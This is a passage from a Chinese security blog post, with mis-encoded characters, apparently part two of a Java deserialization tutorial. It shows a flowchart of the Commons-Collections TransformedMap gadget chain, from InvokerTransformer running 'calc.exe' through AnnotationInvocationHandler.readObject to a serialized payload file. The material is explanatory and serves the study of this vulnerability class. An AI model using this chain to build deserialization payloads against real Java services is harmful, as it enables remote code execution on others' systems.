<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">graph TB</span><br><span class="line">A[å¼€å§‹] --&gt;B(&quot;Object runtime&quot;)</span><br><span class="line">    B  -- åå°„è°ƒç”¨ --&gt; C(&quot;InvokerTransformer(&#x27;exec&#x27;,String.class,&#x27;calc.exe&#x27;).transform(runtime)&quot;)</span><br><span class="line">    C--æ¥å£å›è°ƒ--&gt;D(&quot;Transformer.transform()&quot;)</span><br><span class="line">    e1--è¿”å›--&gt;D(&quot;Transformer.transform()&quot;)</span><br><span class="line">    A6--è§¦å‘--&gt;F0(&quot;(Map) outerMap&quot;)</span><br><span class="line">    F0--è¿”å›--&gt;F(&quot;(Map) decorate()&quot;)</span><br><span class="line">    F--è¿”å›--&gt;E(&quot;TransformedMap&quot;)</span><br><span class="line">   E--è¿”å›--&gt;e1(&quot;TransformedMap.decorate()&quot;)</span><br><span class="line">    D --æ¥å£å›è°ƒ--&gt; e1(&quot;TransformedMap.decorate()&quot;)</span><br><span class="line">    D --æ¥å£å›è°ƒ--&gt; e2(&quot;TransformedMap.checkSetValue()&quot;)</span><br><span class="line">    e1--è°ƒç”¨æ„é€ å‡½æ•°ç”Ÿæˆå®ä¾‹å¯¹è±¡--&gt;E(&quot;TransformedMap&quot;)</span><br><span class="line">    E--æ¥å£å›è°ƒ--&gt; F(&quot;(Map) decorate()&quot;)</span><br><span class="line">    F--ç”Ÿæˆ--&gt;F0(&quot;(Map) outerMap&quot;)</span><br><span class="line">    e2 --è¿”å›è°ƒç”¨transformç»“æœ--&gt; G(&quot;(Map) checkSetValue()&quot;)</span><br><span class="line">    G--Javaçš„ç»§æ‰¿å’Œå‘ä¸Šè½¬å‹--&gt; A1(&quot;(Map.Entry) setValue()&quot;)</span><br><span class="line">    A1--Javaåå°„--&gt; A2(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)</span><br><span class="line">    A2--å®ä¾‹åŒ–å¯¹è±¡--&gt; A3(&quot;(Object)  ctor.newInstance(Target.class, outerMap)&quot;)</span><br><span class="line">    A3--ç”Ÿæˆå¯¹è±¡--&gt; A4(&quot;(AnnotationInvocationHandler)  instance&quot;)</span><br><span class="line">    A4--åºåˆ—åŒ–å¯¹è±¡instanceç”Ÿæˆæ¶æ„payload--&gt;A5(&quot;payload.bin&quot;)</span><br><span class="line">    A5--æ¶æ„åºåˆ—åŒ–æ–‡ä»¶è¾“å…¥--&gt;A6(&quot;sun.reflect.annotation.AnnotationInvocationHandler.readObject()&quot;)</span><br><span class="line">    A5--æ¥å£å›è°ƒè°ƒç”¨é‡å†™çš„AnnotationInvocationHandler.readObject--&gt;A6(&quot;sun.reflect.annotation.AnnotationInvocationHandler.readObject()&quot;)</span><br><span class="line">    A6--è§¦å‘--&gt;A7(&quot;sun.reflect.annotation.AnnotationInvocationHandler.readObject().setValue()&quot;)</span><br><span class="line">    A7--è¿”å›--&gt;A1(&quot;(Map.Entry) setValue()&quot;)</span><br><span class="line">A1--è¿”å›--&gt;G(&quot;(Map) checkSetValue()&quot;)</span><br><span class="line">G(&quot;(Map) checkSetValue()&quot;)--è¿”å›--&gt;e2(&quot;TransformedMap.checkSetValue()&quot;)</span><br><span class="line">e2--è¿”å›--&gt;D(&quot;Transformer.transform()&quot;)</span><br><span class="line">D--è¿”å›--&gt;C(&quot;InvokerTransformer(&#x27;exec&#x27;,String.class,&#x27;calc.exe&#x27;).transform(runtime)&quot;)</span><br><span class="line">C--è¿”å›--&gt;B(&quot;Object runtime&quot;)</span><br><span class="line">B--æ‰§è¡Œå‘½ä»¤calc.exe--&gt;N[ç»“æŸ]</span><br></pre></td></tr></table></figure>

        </div>

    </div>

    

    

    

    
<div class="article-copyright hairline">
  <p>
    æœ¬ä½œå“é‡‡ç”¨ <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç¦æ­¢æ¼”ç» 4.0 å›½é™…è®¸å¯åè®®</a> è¿›è¡Œè®¸å¯ã€‚
  </p>
</div>


    

    
<nav class="article-nav">
  
    <a href="/2021/03/29/Pystinger%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BACS%E4%B8%8A%E7%BA%BF/" id="article-nav-newer" class="article-nav-link-wrap">
      <div class="article-nav-caption">ä¸‹ä¸€ç¯‡</div>
      <div class="article-nav-title">
        
          Pystingerå®ç°å†…ç½‘ä¸»æœºCSä¸Šçº¿
        
      </div>
    </a>
  
  
    <a href="/2021/03/23/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E4%B8%80%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-caption">ä¸Šä¸€ç¯‡</div>
      <div class="article-nav-title">Java ååºåˆ—åŒ–åˆ†æä»å…¥é—¨åˆ°æ”¾å¼ƒï¼ˆä¸€ï¼‰</div>
    </a>
  
</nav>


    <section class="share">
        <div class="share-title">åˆ†äº«</div>
        <a class="share-item" target="_blank"
            href="https://twitter.com/share?text=Java ååºåˆ—åŒ–åˆ†æä»å…¥é—¨åˆ°æ”¾å¼ƒï¼ˆäºŒï¼‰ - MyBlogs&url=http://example.com/2021/03/23/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E4%BA%8C%EF%BC%89/">
            <box-icon type='logo' name='twitter'></box-icon>
        </a>
        <a class="share-item" target="_blank"
            href="https://www.facebook.com/sharer.php?title=Java ååºåˆ—åŒ–åˆ†æä»å…¥é—¨åˆ°æ”¾å¼ƒï¼ˆäºŒï¼‰ - MyBlogs&u=http://example.com/2021/03/23/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E4%BA%8C%EF%BC%89/">
            <box-icon name='facebook-square' type='logo' ></box-icon>
        </a>
        <!-- <a class="share-item" target="_blank"
            href="https://service.weibo.com/share/share.php?title=Java ååºåˆ—åŒ–åˆ†æä»å…¥é—¨åˆ°æ”¾å¼ƒï¼ˆäºŒï¼‰ - MyBlogs&url=http://example.com/2021/03/23/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E4%BA%8C%EF%BC%89/&pic=">
            <div class="n-icon n-icon-weibo"></div>
        </a> -->
    </section>

</article>






<section class="comments">
    <div id="gitalk-container"></div>
</section>







<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

</div>
                </section>
            </section>

            
            <aside class="sidebar sidebar-search-fix">
                

    <div class="search">
    <div class="has-icon-right">
        <input type="text" class="form-input" id="search" placeholder="SEARCH" autocomplete="off">
        <div class="form-icon">
            <box-icon name='search' color="#3c4859"></box-icon>
        </div>
    </div>
    <div class="search-result" id="search-ps"></div>
</div>


<div class="widget" id="widget">
    
      
  <div class="widget-wrap">
    <div class="widget-inner">
      <div class="toc post-toc-html"></div>
    </div>
  </div>

    
      
  <div class="widget-wrap widget-cate">
    <div class="widget-title"><span>Categories</span></div>
    <div class="widget-inner">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Webæ¸—é€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">å†…ç½‘æ¸—é€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">å·¥å…·ä½¿ç”¨</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">å¼€å‘è¯­è¨€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">æ“ä½œç³»ç»Ÿ</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">æ•°æ®åº“</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E9%A1%B9/">æ‚é¡¹</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">æº¯æºååˆ¶</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">æ¼æ´å¤ç°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">ç¯å¢ƒé…ç½®</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">è„šæœ¬å¼€å‘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BF%90%E7%BB%B4/">è¿ç»´</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap widget-tags">
    <div class="widget-title"><span>Tags</span></div>
    <div class="widget-inner">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARL/" rel="tag">ARL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Access/" rel="tag">Access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bugku/" rel="tag">Bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cap-Pwd/" rel="tag">Cap_Pwd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GetShell/" rel="tag">GetShell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Goby/" rel="tag">Goby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lfi/" rel="tag">Lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/" rel="tag">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Oracle/" rel="tag">Oracle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Proxy/" rel="tag">Proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pth/" rel="tag">Pth</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sql/" rel="tag">Sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VulLab/" rel="tag">VulLab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xff/" rel="tag">Xff</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xray/" rel="tag">Xray</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap widget-recent-posts">
    <div class="widget-title"><span>Recent Posts</span></div>
    <div class="widget-inner">
      <ul>
        
          <li>
            <a href="/2021/11/18/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2021/08/15/%E5%8F%8D%E5%88%B6Goby%E6%89%AB%E6%8F%8F%E4%B9%8BXSS%E7%82%B9%E5%87%BB%E4%B8%8A%E7%BA%BF/">ååˆ¶Gobyæ‰«æä¹‹XSSç‚¹å‡»ä¸Šçº¿</a>
          </li>
        
          <li>
            <a href="/2021/08/11/docx%E6%89%B9%E9%87%8F%E8%BD%ACmarkdown%E8%84%9A%E6%9C%AC%E5%88%86%E4%BA%AB/">docxæ‰¹é‡è½¬markdownè„šæœ¬åˆ†äº«</a>
          </li>
        
          <li>
            <a href="/2021/08/02/CS%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E5%AE%9E%E8%B7%B5/">CSåˆ†ç¦»å…æ€å®è·µ</a>
          </li>
        
          <li>
            <a href="/2021/06/17/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86-%E6%B3%A8%E5%85%A5%E7%B1%BB-1-SQL%E6%B3%A8%E5%85%A5-Oracle/">æ¸—é€æµ‹è¯•çŸ¥è¯†æ¢³ç†-æ³¨å…¥ç±»-1-SQLæ³¨å…¥-Oracle</a>
          </li>
        
      </ul>
    </div>
  </div>

    
      
  <div class="widget-wrap widget-archive">
    <div class="widget-title"><span>Archive</span></div>
    <div class="widget-inner">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a></li></ul>
    </div>
  </div>


    
</div>

<div id="backtop"><i class="icon icon-arrow-up"></i></div>
            </aside>
            
        </div>
    </div>

    <footer class="footer">
    <div class="footer-wave">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
    </div>

    <div class="footer-wrap">
        <div class="footer-inner"> 
            MyBlogs &copy; 2021<br>
            Powered By Hexo Â· Theme By <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Aomori</a>
        </div>
    </div>

</footer>


<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>





<script src="/dist/build.js?1637200696663.js"></script>


<script src="/dist/custom.js?1637200696663.js"></script>



<!-- ç™¾åº¦é“¾æ¥æäº¤ -->
<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        }
        else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>



<!-- Google Analytics-->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-XXXXX-X"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() { dataLayer.push(arguments); }
    gtag('js', new Date());
    gtag('config', 'UA-XXXXX-X');
</script>





</body>

</html>